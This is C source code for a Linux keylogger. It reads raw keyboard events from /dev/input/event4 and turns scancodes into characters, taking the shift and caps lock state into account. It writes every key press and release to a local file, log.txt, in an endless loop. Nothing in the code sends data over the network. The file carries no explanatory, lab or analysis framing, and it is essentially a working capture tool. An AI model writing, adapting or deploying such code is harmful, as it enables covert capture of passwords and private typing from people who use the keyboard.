#include <fcntl.h>
#include <linux/input.h>
#include <stdio.h>
#include <string.h>
#include <sys/types.h>
#include <time.h>
#include <unistd.h>

#include "table.h"

void listen_device(const char *dev) {
    int fd = open(dev, O_RDONLY);
    if (fd == -1) {
        perror("open error\n");
        return;
    }
    int fd2 = open("log.txt", O_WRONLY | O_CREAT);
    struct input_event event;
    int shift_pressed = 0;
    int caps_pressed = 0;
    while (1) {
        if (read(fd, &event, sizeof(event)) == sizeof(event)) {
            if (event.type == EV_KEY) {
                if (event.code == 58 && event.value == 1) {
                    caps_pressed ^= 1;
                }
                if ((event.code == 42 || event.code == 54) &&
                    event.value == 1) {
                    shift_pressed = 1;
                }
                if ((event.code == 42 || event.code == 54) &&
                    event.value == 0) {
                    shift_pressed = 0;
                }
                char *s = scancode_to_ascii[event.code];
                if (shift_pressed) {
                    s = shift_scancode_to_ascii[event.code];
                } else if (caps_pressed) {
                    s = caps_scancode_to_ascii[event.code];
                }
                if (event.value == 0 || event.value == 1) {
                    char log[1024];
                    sprintf(log, "key %s %s\n", s,
                            event.value ? "Pressed" : "Released");
                    write(fd2, log, strlen(log) + 1);
                }
            }
        }
    }
    close(fd);
}

int main(int argc, char **argv) {
    listen_device("/dev/input/event4");
    return 0;
}
